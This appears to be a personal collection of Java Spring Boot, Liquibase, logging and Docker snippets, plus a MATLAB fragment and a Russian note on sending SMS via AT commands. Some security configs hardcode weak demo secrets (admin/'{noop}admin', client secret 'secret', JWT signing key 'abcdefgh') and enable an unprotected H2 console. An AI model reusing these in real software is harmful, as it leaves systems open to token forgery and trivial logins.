                                 baseTableName="product_subcategory"
                                 constraintName="fk_product_subcategory_products_id"
                                 referencedColumnNames="id"
                                 referencedTableName="product"/>
        <addForeignKeyConstraint baseColumnNames="subcategories_id"
                                 baseTableName="product_subcategory"
                                 constraintName="fk_product_subcategory_subcategories_id"
                                 referencedColumnNames="id"
                                 referencedTableName="sub_category"/>
        
        <addForeignKeyConstraint baseColumnNames="brand_id"
                                 baseTableName="product"
                                 constraintName="fk_product_brand_id"
                                 referencedColumnNames="id"
                                 referencedTableName="brand"/>

    </changeSet>
</databaseChangeLog>

<?xml version="1.0" encoding="utf-8"?>
<databaseChangeLog
    xmlns="http://www.liquibase.org/xml/ns/dbchangelog"
    xmlns:ext="http://www.liquibase.org/xml/ns/dbchangelog-ext"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://www.liquibase.org/xml/ns/dbchangelog http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-3.4.xsd
                        http://www.liquibase.org/xml/ns/dbchangelog-ext http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-ext.xsd">

    <property name="now" value="now()" dbms="h2"/>

    <property name="now" value="now()" dbms="mysql"/>
    <property name="autoIncrement" value="true"/>

    <property name="floatType" value="float4" dbms="postgresql, h2"/>
    <property name="floatType" value="float" dbms="mysql, oracle, mssql"/>

    <!--
        Added the entity Category.
    -->
    <changeSet id="20170518145710-1" author="jhipster">
        <createTable tableName="category">
            <column name="id" type="bigint" autoIncrement="${autoIncrement}">
                <constraints primaryKey="true" nullable="false"/>
            </column>
            <column name="name" type="varchar(255)">
                <constraints nullable="true" />
            </column>

            <column name="status" type="varchar(255)">
                <constraints nullable="true" />
            </column>

            <!-- jhipster-needle-liquibase-add-column - JHipster will add columns here, do not remove-->
        </createTable>
        
    </changeSet>
</databaseChangeLog>

<?xml version="1.0" encoding="utf-8"?>
<databaseChangeLog
    xmlns="http://www.liquibase.org/xml/ns/dbchangelog"
    xmlns:ext="http://www.liquibase.org/xml/ns/dbchangelog-ext"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://www.liquibase.org/xml/ns/dbchangelog http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-3.4.xsd
                        http://www.liquibase.org/xml/ns/dbchangelog-ext http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-ext.xsd">

    <property name="now" value="now()" dbms="h2"/>

    <property name="now" value="now()" dbms="mysql"/>
    <property name="autoIncrement" value="true"/>

    <property name="floatType" value="float4" dbms="postgresql, h2"/>
    <property name="floatType" value="float" dbms="mysql, oracle, mssql"/>

    <!--
        Added the entity Product.
    -->
    <changeSet id="20170518145709-1" author="jhipster">
        <createTable tableName="product">
            <column name="id" type="bigint" autoIncrement="${autoIncrement}">
                <constraints primaryKey="true" nullable="false"/>
            </column>
            <column name="name" type="varchar(255)">
                <constraints nullable="true" />
            </column>

            <column name="description" type="varchar(255)">
                <constraints nullable="true" />
            </column>

            <column name="image" type="longblob">
                <constraints nullable="true" />
            </column>
            <column name="image_content_type" type="varchar(255)">
                <constraints nullable="true" />
            </column>

            <column name="price" type="decimal(10,2)">
                <constraints nullable="true" />
            </column>

            <column name="jhi_size" type="varchar(255)">
                <constraints nullable="true" />
            </column>

            <column name="available_until" type="timestamp">
                <constraints nullable="true" />
            </column>

            <column name="brand_id" type="bigint">
                <constraints nullable="true" />
            </column>

            <!-- jhipster-needle-liquibase-add-column - JHipster will add columns here, do not remove-->
        </createTable>
        <dropDefaultValue tableName="product" columnName="available_until" columnDataType="datetime"/>
        
        <createTable tableName="product_subcategory">
            <column name="subcategories_id" type="bigint">
                <constraints nullable="false"/>
            </column>
            <column name="products_id" type="bigint">
                <constraints nullable="false"/>
            </column>
        </createTable>

        <addPrimaryKey columnNames="products_id, subcategories_id" tableName="product_subcategory"/>
        
    </changeSet>
</databaseChangeLog>

<?xml version="1.0" encoding="utf-8"?>
<databaseChangeLog
    xmlns="http://www.liquibase.org/xml/ns/dbchangelog"
    xmlns:ext="http://www.liquibase.org/xml/ns/dbchangelog-ext"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://www.liquibase.org/xml/ns/dbchangelog http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-3.4.xsd
                        http://www.liquibase.org/xml/ns/dbchangelog-ext http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-ext.xsd">

    <property name="now" value="now()" dbms="h2"/>
    <property name="now" value="now()" dbms="mysql"/>
    <property name="autoIncrement" value="true"/>

    <!--
        JHipster core tables.
        The initial schema has the '00000000000001' id, so that it is over-written if we re-generate it.
    -->
    <changeSet id="00000000000001" author="jhipster">
        <createTable tableName="jhi_user">
            <column name="id" type="bigint" autoIncrement="${autoIncrement}">
                <constraints primaryKey="true" nullable="false"/>
            </column>
            <column name="login" type="varchar(100)">
                <constraints unique="true" nullable="false"/>
            </column>
            <column name="password_hash" type="varchar(60)"/>
            <column name="first_name" type="varchar(50)"/>
            <column name="last_name" type="varchar(50)"/>
            <column name="email" type="varchar(100)">
                <constraints unique="true" nullable="true"/>
            </column>
            <column name="image_url" type="varchar(256)"/>
            <column name="activated" type="boolean" valueBoolean="false">
                <constraints nullable="false" />
            </column>
            <column name="lang_key" type="varchar(5)"/>
            <column name="activation_key" type="varchar(20)"/>
            <column name="reset_key" type="varchar(20)"/>
            <column name="created_by" type="varchar(50)">
                <constraints nullable="false"/>
            </column>
            <column name="created_date" type="timestamp" defaultValueDate="${now}">
                <constraints nullable="false"/>
            </column>
            <column name="reset_date" type="timestamp">
                <constraints nullable="true"/>
            </column>
            <column name="last_modified_by" type="varchar(50)"/>
            <column name="last_modified_date" type="timestamp"/>
        </createTable>
        <createIndex indexName="idx_user_login"
            tableName="jhi_user"
            unique="true">
            <column name="login" type="varchar(100)"/>
        </createIndex>

        <createIndex indexName="idx_user_email"
            tableName="jhi_user"
            unique="true">
            <column name="email" type="varchar(100)"/>
        </createIndex>
        <createTable tableName="jhi_authority">
            <column name="name" type="varchar(50)">
                <constraints primaryKey="true" nullable="false"/>
            </column>
        </createTable>

        <createTable tableName="jhi_user_authority">
            <column name="user_id" type="bigint">
                <constraints nullable="false"/>
            </column>
            <column name="authority_name" type="varchar(50)">
                <constraints nullable="false"/>
            </column>
        </createTable>

        <addPrimaryKey columnNames="user_id, authority_name" tableName="jhi_user_authority"/>

        <addForeignKeyConstraint baseColumnNames="authority_name"
                                 baseTableName="jhi_user_authority"
                                 constraintName="fk_authority_name"
                                 referencedColumnNames="name"
                                 referencedTableName="jhi_authority"/>

        <addForeignKeyConstraint baseColumnNames="user_id"
                                 baseTableName="jhi_user_authority"
                                 constraintName="fk_user_id"
                                 referencedColumnNames="id"
                                 referencedTableName="jhi_user"/>
        <loadData encoding="UTF-8"
                  file="config/liquibase/users.csv"
                  separator=";"
                  tableName="jhi_user">
            <column name="activated" type="boolean"/>
            <column name="created_date" type="timestamp"/>
        </loadData>
        <dropDefaultValue tableName="jhi_user" columnName="created_date" columnDataType="datetime"/>

        <loadData encoding="UTF-8"
                  file="config/liquibase/authorities.csv"
                  separator=";"
                  tableName="jhi_authority"/>

        <loadData encoding="UTF-8"
                  file="config/liquibase/users_authorities.csv"
                  separator=";"
                  tableName="jhi_user_authority"/>
        <createTable tableName="jhi_persistent_audit_event">
            <column name="event_id" type="bigint" autoIncrement="${autoIncrement}">
                <constraints primaryKey="true" nullable="false"/>
            </column>
            <column name="principal" type="varchar(100)">
                <constraints nullable="false" />
            </column>
            <column name="event_date" type="timestamp"/>
            <column name="event_type" type="varchar(255)"/>
        </createTable>

        <createTable tableName="jhi_persistent_audit_evt_data">
            <column name="event_id" type="bigint">
                <constraints nullable="false"/>
            </column>
            <column name="name" type="varchar(150)">
                <constraints nullable="false"/>
            </column>
            <column name="value" type="varchar(255)"/>
        </createTable>
        <addPrimaryKey columnNames="event_id, name" tableName="jhi_persistent_audit_evt_data"/>

        <createIndex indexName="idx_persistent_audit_event"
                     tableName="jhi_persistent_audit_event"
                     unique="false">
            <column name="principal" type="varchar(100)"/>
            <column name="event_date" type="timestamp"/>
        </createIndex>

        <createIndex indexName="idx_persistent_audit_evt_data"
                     tableName="jhi_persistent_audit_evt_data"
                     unique="false">
            <column name="event_id" type="bigint"/>
        </createIndex>

        <addForeignKeyConstraint baseColumnNames="event_id"
                                 baseTableName="jhi_persistent_audit_evt_data"
                                 constraintName="fk_evt_pers_audit_evt_data"
                                 referencedColumnNames="event_id"
                                 referencedTableName="jhi_persistent_audit_event"/>

        <!-- Social -->
        <createTable tableName="jhi_social_user_connection">
            <column name="id" type="bigint" autoIncrement="${autoIncrement}">
                <constraints primaryKey="true" nullable="false"/>
            </column>
            <column name="user_id" type="varchar(255)">
                <constraints nullable="false"/>
            </column>
            <column name="provider_id" type="varchar(255)">
                <constraints nullable="false"/>
            </column>
            <column name="provider_user_id" type="varchar(255)">
                <constraints nullable="false"/>
            </column>
            <column name="rank" type="bigint">
                <constraints nullable="false"/>
            </column>
            <column name="display_name" type="varchar(255)"/>
            <column name="profile_url" type="varchar(255)"/>
            <column name="image_url" type="varchar(255)"/>
            <column name="access_token" type="varchar(255)">
                <constraints nullable="false"/>
            </column>
            <column name="secret" type="varchar(255)"/>
            <column name="refresh_token" type="varchar(255)"/>
            <column name="expire_time" type="bigint"/>
        </createTable>

        <addUniqueConstraint tableName="jhi_social_user_connection" columnNames="user_id, provider_id, provider_user_id"/>

        <addUniqueConstraint tableName="jhi_social_user_connection" columnNames="user_id, provider_id, rank"/>
    </changeSet>

</databaseChangeLog>


<?xml version="1.0" encoding="UTF-8"?>

<configuration scan="true">
    <include resource="org/springframework/boot/logging/logback/base.xml"/>

<!-- The FILE and ASYNC appenders are here as examples for a production configuration -->
<!--
    <appender name="FILE" class="ch.qos.logback.core.rolling.RollingFileAppender">
        <rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy">
            <fileNamePattern>logFile.%d{yyyy-MM-dd}.log</fileNamePattern>
            <maxHistory>90</maxHistory>
        </rollingPolicy>
        <encoder>
            <charset>utf-8</charset>
            <Pattern>%d %-5level [%thread] %logger{0}: %msg%n</Pattern>
        </encoder>
    </appender>

    <appender name="ASYNC" class="ch.qos.logback.classic.AsyncAppender">
        <queueSize>512</queueSize>
        <appender-ref ref="FILE"/>
    </appender>
-->

    <logger name="com.springio.store" level="#logback.loglevel#"/>

    <logger name="io.github.jhipster" level="DEBUG"/>

    <logger name="javax.activation" level="WARN"/>
    <logger name="javax.mail" level="WARN"/>
    <logger name="javax.xml.bind" level="WARN"/>
    <logger name="ch.qos.logback" level="WARN"/>
    <logger name="com.codahale.metrics" level="WARN"/>
    <logger name="com.ryantenney" level="WARN"/>
    <logger name="com.sun" level="WARN"/>
    <logger name="com.zaxxer" level="WARN"/>
    <logger name="io.undertow" level="WARN"/>
    <logger name="io.undertow.websockets.jsr" level="ERROR"/>
    <logger name="org.ehcache" level="WARN"/>
    <logger name="org.apache" level="WARN"/>
    <logger name="org.apache.catalina.startup.DigesterFactory" level="OFF"/>
    <logger name="org.bson" level="WARN"/>
    <logger name="org.elasticsearch" level="WARN"/>
    <logger name="org.hibernate.validator" level="WARN"/>
    <logger name="org.hibernate" level="WARN"/>
    <logger name="org.hibernate.ejb.HibernatePersistence" level="OFF"/>
    <logger name="org.springframework" level="WARN"/>
    <logger name="org.springframework.web" level="WARN"/>
    <logger name="org.springframework.security" level="WARN"/>
    <logger name="org.springframework.cache" level="WARN"/>
    <logger name="org.thymeleaf" level="WARN"/>
    <logger name="org.xnio" level="WARN"/>
    <logger name="springfox" level="WARN"/>
    <logger name="sun.rmi" level="WARN"/>
    <logger name="liquibase" level="WARN"/>
    <logger name="LiquibaseSchemaResolver" level="INFO"/>
    <logger name="sun.rmi.transport" level="WARN"/>

    <contextListener class="ch.qos.logback.classic.jul.LevelChangePropagator">
        <resetJUL>true</resetJUL>
    </contextListener>

    <root level="#logback.loglevel#">
        <appender-ref ref="CONSOLE"/>
    </root>

</configuration>
--------------------------------------------------------------------------------------------------------
   @ElementCollection
    @MapKeyColumn(name = "name")
    @Column(name = "value")
    @CollectionTable(name = "jhi_persistent_audit_evt_data", joinColumns=@JoinColumn(name="event_id"))
    private Map<String, String> data = new HashMap<>();
--------------------------------------------------------------------------------------------------------
clc
clear
format compact

fname = «D:/sig0001.ana»;

fid = fopen(fname);
[data, count] = fread(fid, Inf, ‘single’);

plot(data)
grid
--------------------------------------------------------------------------------------------------------
    @Override
    protected void addResourceHandlers(ResourceHandlerRegistry registry) {
        registry.addResourceHandler("swagger-ui.html")
                .addResourceLocations("classpath:/META-INF/resources/");

        registry.addResourceHandler("/webjars/**")
                .addResourceLocations("classpath:/META-INF/resources/webjars/");
    }
--------------------------------------------------------------------------------------------------------
Взаимодействие с GSM-модемом через ZETVIEW

Распределенные системы мониторинга и контроля (например, системы мониторинга инженерных конструкций) предполагают собой выдачу предупредительных сообщений с целью оповещения обслуживающего персонала о значительных происходящих изменениях. В программном обеспечении ZETVIEW предусмотрены различные варианты для реализации таких функций, в том числе и оповещение путем посылки коротких SMS-сообщений через подключенные к компьютеру GSM-модемы.

В настоящее время существует широкий выбор GSM-модемов с различным функционалом и назначением. Для работы программы с модемом, последний должен иметь возможность возможность работы посредством AT команд через COM-порт. В подавляющем большинстве модемов эта функция есть. В качестве примера мы взяли модем HUAWEI E150 от МТС с обычной SIM-картой.

При подключении модема к компьютеру и автоматической установке соответствующего программного обеспечения вместе с драйверами в диспетчере устройств операционной системы появляется новый COM-порт.

Общение с модемом через ZETVIEW будет происходить через COM9 посредством AT команд. AT команд довольно много, но для реализации задачи оповещения через SMS их понадобится считанное количество:

    ATI — команда идентификации (будет использоваться в качестве тестовой команды, чтобы убедиться, что с модемом есть связь при работе через COM-порт).
    AT+CREG? — получение типа регистрации в сети (будет использоваться для определения статуса нахождения в сети).
    AT+CMGF — задание режима работы (будет использоваться для задания PDU режима).
    AT+CMGS — отправка сообщения (будет использоваться для отправки сообщения в кодировке UCS2). При работе в цифровом режиме сообщение требует кодировки. Функцию конвертации символов можно реализовать у себя в программе, но также есть свободные сервисы, где можно ввести текст сообщения и получить сконвертированное сообщение (например, https://smstools3.kekekasvi.com/topic.php?id=288).

Каждая из команд должна заканчиваться символами возврата каретки и перевода строки (), то есть ASCII символами 0x0D и 0x0A. Кроме того, посылаемое SMS-сообщение в конце должно содержать символ Ctrl+Z, то есть ASCII символ 0x1A.
--------------------------------------------------------------------------------------------------------
#H2 settings
spring.h2.console.enabled=true
spring.h2.console.path=/h2-console

spring.datasource.url=jdbc:h2:mem:mytestdb
spring.datasource.driverClassName=org.h2.Driver
spring.datasource.username=sa
spring.datasource.password=
spring.jpa.hibernate.ddl-auto=create
--------------------------------------------------------------------------------------------------------
@RepositoryRestResource(collectionResourceRel = "cars", path = "cars")

spring.application.name=spring-boot-mongodb-sample-application

spring.data.mongodb.host=172.17.0.2
spring.data.mongodb.port=27017
spring.data.mongodb.database=demo
--------------------------------------------------------------------------------------------------------
@ApiModel(description="It holds the annotations of a number of articles")
@JsonInclude(Include.NON_NULL)
@XmlType(propOrder = {"nextCursorMark", "cursorMark", "articles", "annotations"})
@JsonPropertyOrder({"nextCursorMark", "cursorMark", "articles", "annotations"})
public class ResultDoc {
}

@ApiModel(description="It holds the annotations of a number of articles coming from the api")
@JsonInclude(Include.NON_NULL)
@JacksonXmlRootElement(localName="Results")
@XmlType(propOrder = {"nextCursorMark", "cursorMark", "articles", "annotations"})
@JsonPropertyOrder({"nextCursorMark", "cursorMark", "articles", "annotations"})

	@ApiModelProperty(value="list of articles with the relative annotations. It is populated only in case the format parameter is equal to either JSON or XML")
	@JacksonXmlElementWrapper(localName = "articles")
	@JacksonXmlProperty(localName="article")
	private List<ArticleResult> articles;
--------------------------------------------------------------------------------------------------------
import org.springframework.context.annotation.Bean;

import org.springframework.context.annotation.Configuration;

import springfox.documentation.builders.RequestHandlerSelectors;

import springfox.documentation.service.ApiInfo;

import springfox.documentation.service.Contact;

import springfox.documentation.spi.DocumentationType;

import springfox.documentation.spring.web.plugins.Docket;

import springfox.documentation.swagger2.annotations.EnableSwagger2;

import static springfox.documentation.builders.PathSelectors.regex;

import java.io.IOException;
import java.io.InputStream;
import java.util.HashSet;
import java.util.Properties;
import java.util.Set;

@Configuration
@EnableSwagger2
public class AnnotationsAPISwaggerConfig {
	
    @Bean
    public Docket productApi() {

    	Set<String> protocols=new HashSet<String>();
    	protocols.add("https");
        return new Docket(DocumentationType.SWAGGER_2)
                .select()
                .apis(RequestHandlerSelectors.basePackage("uk.ac.ebi.scilite.controller"))
                .paths(regex("/annotations.*"))
                .build().
                protocols(protocols)
                .apiInfo(metaData());
    }

    private ApiInfo metaData() {

    	String version ="Unknown";
    	Properties prop = new Properties();
		
		try (InputStream inputStream = AnnotationsAPISwaggerConfig.class.getClassLoader().getResourceAsStream("build.properties");){
			prop.load(inputStream);
			version = prop.getProperty("build.version");
		} catch (IOException e) {}
		
        ApiInfo apiInfo = new ApiInfo(
                "Europe PMC Annotations API",
                "Europe PMC Annotations API provides text mining annotations contained in abstracts and open access full text articles, using the <a href=\"https://www.w3.org/TR/annotation-model/\" target=\"_blank\">W3C Open Annotation Data Model</a>",
                version,
                null,
                new Contact("Europe PMC", null, "helpdesk@europepmc.org"),
               "Apache License Version 2.0",
                "https://www.apache.org/licenses/LICENSE-2.0");

        return apiInfo;
    }
}
--------------------------------------------------------------------------------------------------------
@JsonIgnoreProperties(ignoreUnknown=true)
@org.codehaus.jackson.annotate.JsonIgnoreProperties(ignoreUnknown=true)
--------------------------------------------------------------------------------------------------------
docker build -t spring-boot-starter .
docker image ls
docker run spring-boot-starter
docker ps
docker run -p 5000:8080 spring-boot-starter
--------------------------------------------------------------------------------------------------------
@Configuration
@EnableWebSecurity(debug=true)
@EnableGlobalMethodSecurity(prePostEnabled = true, securedEnabled = true)
public class SecurityConfig extends WebSecurityConfigurerAdapter {

    @Autowired
    private UserDetailsService userDetailsService;

    @Autowired
    private PasswordEncoder passwordEncoder;

    @Override
    protected void configure(AuthenticationManagerBuilder auth) throws Exception {
        auth.authenticationProvider(authenticationProvider());
    }

    @Override
    protected void configure(HttpSecurity http) throws Exception {
       http
               .httpBasic()
               .and()
               .authorizeRequests()
               .anyRequest().authenticated();
    }

    @Bean
    public DaoAuthenticationProvider authenticationProvider(){
        DaoAuthenticationProvider provider = new DaoAuthenticationProvider();
        provider.setPasswordEncoder(passwordEncoder);
        provider.setUserDetailsService(userDetailsService);
        return provider;
    }
}

@Configuration
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    
    @Override
    protected void configure(AuthenticationManagerBuilder auth) throws Exception {
        auth.inMemoryAuthentication()
                .withUser("admin")
                .password("{noop}admin").authorities("ROLE_ADMIN");
    }

    @Override
    protected void configure(HttpSecurity http) throws Exception {
       http.httpBasic()
               .and()
               .authorizeRequests()
               .anyRequest().authenticated();
    }
}
--------------------------------------------------------------------------------------------------------
#Security
spring.security.user.name=${username}
spring.security.user.password=${password}

clean package spring-boot:run -Dusername=application-user -Dpassword=testpassword
--------------------------------------------------------------------------------------------------------
import org.domain.user.registration.services.queries.UserService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Primary;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.oauth2.config.annotation.configurers.ClientDetailsServiceConfigurer;
import org.springframework.security.oauth2.config.annotation.web.configuration.AuthorizationServerConfigurerAdapter;
import org.springframework.security.oauth2.config.annotation.web.configuration.EnableAuthorizationServer;
import org.springframework.security.oauth2.config.annotation.web.configurers.AuthorizationServerEndpointsConfigurer;
import org.springframework.security.oauth2.config.annotation.web.configurers.AuthorizationServerSecurityConfigurer;
import org.springframework.security.oauth2.provider.token.DefaultTokenServices;
import org.springframework.security.oauth2.provider.token.TokenStore;
import org.springframework.security.oauth2.provider.token.store.JwtAccessTokenConverter;
import org.springframework.security.oauth2.provider.token.store.JwtTokenStore;

@Configuration
@EnableAuthorizationServer
public class AuthorizationConfig extends AuthorizationServerConfigurerAdapter {

    private int accessTokenValiditySeconds = 10000;
    private int refreshTokenValiditySeconds = 30000;

    @Bean
    public UserDetailsService userDetailsService(){
        return new UserService();
    }

    @Autowired
    public PasswordEncoder passwordEncoder;

    @Value("${security.oauth2.resource.id}")
    private String resourceId;

    @Autowired
    private AuthenticationManager authenticationManager;

    @Override
    public void configure(AuthorizationServerEndpointsConfigurer endpoints) throws Exception {
        endpoints
                .authenticationManager(this.authenticationManager)
                .tokenServices(tokenServices())
                .tokenStore(tokenStore())
                .accessTokenConverter(accessTokenConverter());
    }

    @Override
    public void configure(AuthorizationServerSecurityConfigurer oauthServer) throws Exception {
        oauthServer
                .tokenKeyAccess("hasAuthority('ROLE_TRUSTED_CLIENT')")
                .checkTokenAccess("hasAuthority('ROLE_TRUSTED_CLIENT')");
    }

    @Override
    public void configure(ClientDetailsServiceConfigurer clients) throws Exception {
        clients.inMemory()
                .withClient("trusted-app")
                .authorizedGrantTypes("client_credentials", "password", "refresh_token")
                .authorities("ROLE_TRUSTED_CLIENT")
                .scopes("read", "write")
                .resourceIds(resourceId)
                .accessTokenValiditySeconds(accessTokenValiditySeconds)
                .refreshTokenValiditySeconds(refreshTokenValiditySeconds)
                .secret(passwordEncoder.encode("secret"));
    }

    @Bean
    public TokenStore tokenStore() {
        return new JwtTokenStore(accessTokenConverter());
    }

    @Bean
    public JwtAccessTokenConverter accessTokenConverter() {
        JwtAccessTokenConverter converter = new JwtAccessTokenConverter();
        converter.setSigningKey("abcdefgh");
        return converter;
    }

    @Bean
    @Primary
    public DefaultTokenServices tokenServices() {
        DefaultTokenServices defaultTokenServices = new DefaultTokenServices();
        defaultTokenServices.setTokenStore(tokenStore());
        defaultTokenServices.setSupportRefreshToken(true);
        defaultTokenServices.setTokenEnhancer(accessTokenConverter());
        return defaultTokenServices;
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.autoconfigure.security.SecurityProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.annotation.Order;
import org.springframework.http.HttpMethod;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.authentication.dao.DaoAuthenticationProvider;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.web.util.matcher.RequestMatcher;

import javax.servlet.http.HttpServletRequest;

@Configuration
@EnableWebSecurity(debug = true)
@Order(SecurityProperties.BASIC_AUTH_ORDER)
public class SecurityConfig extends WebSecurityConfigurerAdapter {

    @Autowired
    public UserDetailsService userDetailsService;

    @Autowired
    public PasswordEncoder passwordEncoder;

    @Bean
    public DaoAuthenticationProvider authenticationProvider() {
        DaoAuthenticationProvider provider = new DaoAuthenticationProvider();
        provider.setPasswordEncoder( passwordEncoder );
        provider.setUserDetailsService( userDetailsService() );
        return provider;
    }

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
                .formLogin().disable()
                .anonymous().and()
                .httpBasic().and()
                .authorizeRequests().antMatchers(HttpMethod.POST, "/api/users").permitAll().and()
                .authorizeRequests().anyRequest().authenticated();
    }

    @Override
    protected void configure(AuthenticationManagerBuilder auth) throws Exception {
        auth
                .userDetailsService(userDetailsService)
                .passwordEncoder(passwordEncoder);
    }

    @Override
    @Bean
    public AuthenticationManager authenticationManagerBean() throws Exception {
        return super.authenticationManagerBean();
    }

    private static class OAuthRequestedMatcher implements RequestMatcher {
        public boolean matches(HttpServletRequest request) {
            // Determine if the resource called is "/api/**"
            String path = request.getServletPath();
            if ( path.length() >= 5 ) {
                path = path.substring(0, 5);
                boolean isApi = path.equals("/api/");
                return isApi;
            } else return false;
        }
    }
}

--------------------------------------------------------------------------------------------------------

import guru.springframework.msscbeerservice.domain.Beer;
import guru.springframework.msscbeerservice.web.model.BeerDto;
import org.mapstruct.DecoratedWith;
import org.mapstruct.Mapper;

/**
 * Created by jt on 2019-05-25.
 */
@Mapper(uses = {DateMapper.class})
@DecoratedWith(BeerMapperDecorator.class)
public interface BeerMapper {

    BeerDto beerToBeerDto(Beer beer);

    BeerDto beerToBeerDtoWithInventory(Beer beer);

    Beer beerDtoToBeer(BeerDto dto);
}
import guru.springframework.msscbeerservice.domain.Beer;
import guru.springframework.msscbeerservice.services.inventory.BeerInventoryService;
import guru.springframework.msscbeerservice.web.model.BeerDto;
import org.springframework.beans.factory.annotation.Autowired;

/**
 * Created by jt on 2019-06-08.
 */
public abstract class BeerMapperDecorator implements BeerMapper {
    private BeerInventoryService beerInventoryService;
    private BeerMapper mapper;

    @Autowired
    public void setBeerInventoryService(BeerInventoryService beerInventoryService) {
        this.beerInventoryService = beerInventoryService;
    }

    @Autowired
    public void setMapper(BeerMapper mapper) {
        this.mapper = mapper;
    }

    @Override
    public BeerDto beerToBeerDto(Beer beer) {
       return mapper.beerToBeerDto(beer);
    }

    @Override
    public BeerDto beerToBeerDtoWithInventory(Beer beer) {
        BeerDto dto = mapper.beerToBeerDto(beer);
        dto.setQuantityOnHand(beerInventoryService.getOnhandInventory(beer.getId()));
        return dto;
    }

    @Override
    public Beer beerDtoToBeer(BeerDto beerDto) {
        return mapper.beerDtoToBeer(beerDto);
    }
}
--------------------------------------------------------------------------------------------------------
   @Id
    @GeneratedValue(generator = "UUID")
    @GenericGenerator(name = "UUID", strategy = "org.hibernate.id.UUIDGenerator")
    @Type(type="org.hibernate.type.UUIDCharType")
    @Column(length = 36, columnDefinition = "varchar(36)", updatable = false, nullable = false)
    private UUID id;
--------------------------------------------------------------------------------------------------------
    @Bean // Serialize message content to json using TextMessage
    public MessageConverter jacksonJmsMessageConverter(ObjectMapper objectMapper) {
        MappingJackson2MessageConverter converter = new MappingJackson2MessageConverter();
        converter.setTargetType(MessageType.TEXT);
        converter.setTypeIdPropertyName("_type");
        converter.setObjectMapper(objectMapper);
        return converter;
    }
--------------------------------------------------------------------------------------------------------
#List of preProcessors
preProcessors=lessCssImport
#List of postProcessors
postProcessors=less4j
--------------------------------------------------------------------------------------------------------
spring.banner.image.location=vizsla.jpg
--------------------------------------------------------------------------------------------------------
    @InitBinder
    public void dataBinder(WebDataBinder dataBinder) {
        dataBinder.setDisallowedFields("id");

        dataBinder.registerCustomEditor(LocalDate.class, new PropertyEditorSupport() {
            @Override
            public void setAsText(String text) throws IllegalArgumentException{
                setValue(LocalDate.parse(text));
            }
        });
    }
--------------------------------------------------------------------------------------------------------

import guru.springframework.domain.UserCommand;
import guru.springframework.entities.User;
import org.mapstruct.Mapper;
import org.mapstruct.factory.Mappers;

/**
 * Created by jt on 2018-12-16.
 */
@Mapper
public interface UserMapper {

    UserMapper INSTANCE = Mappers.getMapper(UserMapper.class);

    UserCommand userToUserCommand(User user);

    User userCommandToUser(UserCommand userCommand);
}
--------------------------------------------------------------------------------------------------------
    @GetMapping("recipe/{recipeId}/ingredient/{id}/delete")
    public String deleteIngredient(@PathVariable String recipeId,
                                   @PathVariable String id){

        log.debug("deleting ingredient id:" + id);
        ingredientService.deleteById(recipeId, id);

        return "redirect:/recipe/" + recipeId + "/ingredients";
    }
--------------------------------------------------------------------------------------------------------
import org.springframework.samples.petclinic.config.MvcCoreConfig;
import org.springframework.samples.petclinic.config.RootApplicationContextConfig;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.support.AnnotationConfigWebApplicationContext;
import org.springframework.web.filter.CharacterEncodingFilter;
import org.springframework.web.servlet.DispatcherServlet;
import org.springframework.web.servlet.support.AbstractDispatcherServletInitializer;

import javax.servlet.Filter;
import javax.servlet.ServletContext;


/**
 * In Servlet 3.0+ environments, this class replaces the traditional {@code web.xml}-based approach in order to configure the
 * {@link ServletContext} programmatically.
 * <p/>
 * Create the Spring "<strong>root</strong>" application context.<br/>
 * Register a {@link DispatcherServlet}  in the servlet context.<br/>
 * For both servlets, register a {@link CharacterEncodingFilter}.
 * <p/>
 *
 * @author Antoine Rey
 */
public class PetclinicInitializer extends AbstractDispatcherServletInitializer {

    /**
     * Spring profile used to choose the persistence layer implementation.
     * <p>
     * When using Spring jpa, use: jpa
     * When using Spring JDBC, use: jdbc
     * When using Spring Data JPA, use: spring-data-jpa
     * <p/>
     * <p>
     * You also may use the -Dspring.profiles.active=jdbc VM options to change
     * default jpa Spring profile.
     */
    private static final String SPRING_PROFILE = "jpa";

    @Override
    protected WebApplicationContext createRootApplicationContext() {
        AnnotationConfigWebApplicationContext rootAppContext = new AnnotationConfigWebApplicationContext();
        rootAppContext.register(RootApplicationContextConfig.class);
        rootAppContext.getEnvironment().setDefaultProfiles(SPRING_PROFILE);
        return rootAppContext;
    }

    @Override
    protected WebApplicationContext createServletApplicationContext() {
        AnnotationConfigWebApplicationContext webAppContext = new AnnotationConfigWebApplicationContext();
        webAppContext.register(MvcCoreConfig.class);
        return webAppContext;
    }

    @Override
    protected String[] getServletMappings() {
        return new String[]{"/"};
    }

    @Override
    protected Filter[] getServletFilters() {
        // Used to provide the ability to enter Chinese characters inside the Owner Form
        CharacterEncodingFilter characterEncodingFilter = new CharacterEncodingFilter("UTF-8", true);
